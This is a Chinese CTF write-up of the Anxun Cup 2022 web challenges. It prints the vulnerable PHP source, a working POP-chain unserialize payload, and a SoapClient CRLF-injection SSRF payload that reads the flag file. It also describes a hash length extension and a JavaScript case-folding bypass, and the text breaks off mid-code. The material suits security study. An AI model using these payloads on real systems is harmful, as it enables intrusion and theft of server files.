---
title: 安洵杯2022 Web Writeup - 渗透测试中心
url: https://www.cnblogs.com/backlion/p/16941098.html
source: 博客园 - 渗透测试中心
date: 2022-12-02
fetch_date: 2025-10-04T00:18:08.373120
---

# 安洵杯2022 Web Writeup - 渗透测试中心

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250929100304557-587378723.jpg)](https://qoder.com/)

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/backlion/)

# [渗透测试中心](https://www.cnblogs.com/backlion)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/backlion/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83)
* [管理](https://i.cnblogs.com/)
* 订阅
  [![订阅](/skins/coffee/images/xml.gif)](https://www.cnblogs.com/backlion/rss/)

# [安洵杯2022 Web Writeup](https://www.cnblogs.com/backlion/p/16941098.html "发布于 2022-12-01 12:52")

## babyphp

index.php:

```
<?php
//something in flag.php
class A
{
    public $a;
    public $b;
    public function __wakeup()
    {
        $this->a = "babyhacker";
    }
    public function __invoke()
    {
        if (isset($this->a) && $this->a == md5($this->a)) {
            $this->b->uwant();
        }
    }
}
class B
{
    public $a;
    public $b;
    public $k;
    function __destruct()
    {
        $this->b = $this->k;
        die($this->a);
    }
}
class C
{
    public $a;
    public $c;
    public function __toString()
    {
        $cc = $this->c;
        return $cc();
    }
    public function uwant()
    {
        if ($this->a == "phpinfo") {
            phpinfo();
        } else {
            call_user_func(array(reset($_SESSION), $this->a));
        }
    }
}
if (isset($_GET['d0g3'])) {
    ini_set($_GET['baby'], $_GET['d0g3']);
    session_start();
    $_SESSION['sess'] = $_POST['sess'];
}
else{
    session_start();
    if (isset($_POST["pop"])) {
        unserialize($_POST["pop"]);
    }
}
var_dump($_SESSION);
highlight_file(__FILE__);
```

flag.php:

```
<?php
session_start();
highlight_file(__FILE__);
//flag在根目录下
if($_SERVER["REMOTE_ADDR"]==="127.0.0.1"){
    $f1ag=implode(array(new $_GET['a']($_GET['b'])));
    $_SESSION["F1AG"]= $f1ag;
}else{
   echo "only localhost!!";
}
```

通过构造 pop 链查看 phpinfo 发现 session.serialize\_handler 为 php, 再结合 flag.php 的源码推测是利用 session 反序列化 SoapClient 来进行 ssrf

思路就是先控制 ini\_set 的参数指定 serialize\_handler 为 php\_serialize, 传参 sess 为反序列化 SoapClient 的 payload, 然后去掉所有 get post 参数访问一次页面触发反序列化, 最后利用已知 pop 链调用 SoapClient \_\_call 方法来触发 ssrf

ssrf 则先利用 php 的原生类 GlobIterator 来查找根目录下以 f 开头的文件, 然后利用 SplFileObject 读取 flag

pop 链 payload:

```
<?php
class A
{
    public $a;
    public $b;
}
class B
{
}
class C
{
    public $a;
    public $c;
}
$cc = new C();
$cc->a = 'xxxx';
$a = new A();
$a->a = '0e215962017';
$a->b = $cc;
$c = new C();
$c->c = $a;
$b = new B();
$b->a = $c;
echo serialize($b);
```

ssrf payload:

```
<?php
// $a = new SoapClient(null,array('location' => 'http://127.0.0.1/flag.php?a=GlobIterator&b=/f*', 'user_agent' => "111\r\nCookie: PHPSESSID=c9urdtg4kjp5jl36mrl44qlsah", 'uri' => 'test'));
$a = new SoapClient(null,array('location' => 'http://127.0.0.1/flag.php?a=SplFileObject&b=/f1111llllllaagg', 'user_agent' => "111\r\nCookie: PHPSESSID=c9urdtg4kjp5jl36mrl44qlsah", 'uri' => 'test'));
$b = serialize($a);
echo '|'.urlencode($b);
```

先利用 GlobIterator

![https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271930808.png](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221201125121472-1941423802.png "https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271930808.png")

![https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271931449.png](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221201125122710-2063991476.png "https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271931449.png")

![https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271934414.png](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221201125123687-930187291.png "https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271934414.png")

![https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271935912.png](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221201125124691-540449208.png "https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271935912.png")

再利用 SplFileObject

![https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271936690.png](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221201125125657-980909884.png "https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271936690.png")

![https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271936090.png](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221201125126711-678739123.png "https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271936090.png")

![https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271938787.png](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221201125127612-2055080693.png "https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271938787.png")

![https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271938294.png](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221201125128681-320968777.png "https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271938294.png")

## EZ\_JS

登录界面随便输入账号密码, 之后会跳转到 /cookie 路由, 右键注释 jsfuck 解密提示 输入大写

主页右键注释如下:

```
<!--This secret is 7 characters long for security!
hash=md5(secret+"flag");//1946714cfa9deb70cc40bab32872f98a
admin cookie is   md5(secret+urldecode("flag%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00X%00%00%00%00%00%00%00dog"));
-->
```

一眼哈希长度扩展攻击

![https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271942270.png](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221201125129796-949481842.png "https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271942270.png")

直接更改 cookie hash 发现没有用, 后来又将 userid 置空, 出现报错

![https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271943926.png](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221201125130950-1338579008.png "https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271943926.png")

结合之前的提示, 利用 js 的大小写特性:

```
'ı'.toUpperCase() == 'I' // true
```

![https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271944110.png](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221201125131826-1770077427.png "https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271944110.png")

之后跳转到 /infoflllllag (静态环境每 30 分钟重置, 所以截的是之前的图)

```
var express = require('express');
var router = express.Router();
const isObject = obj => obj && obj.constructor && obj.constructor === Object;
const merge = (a, b)...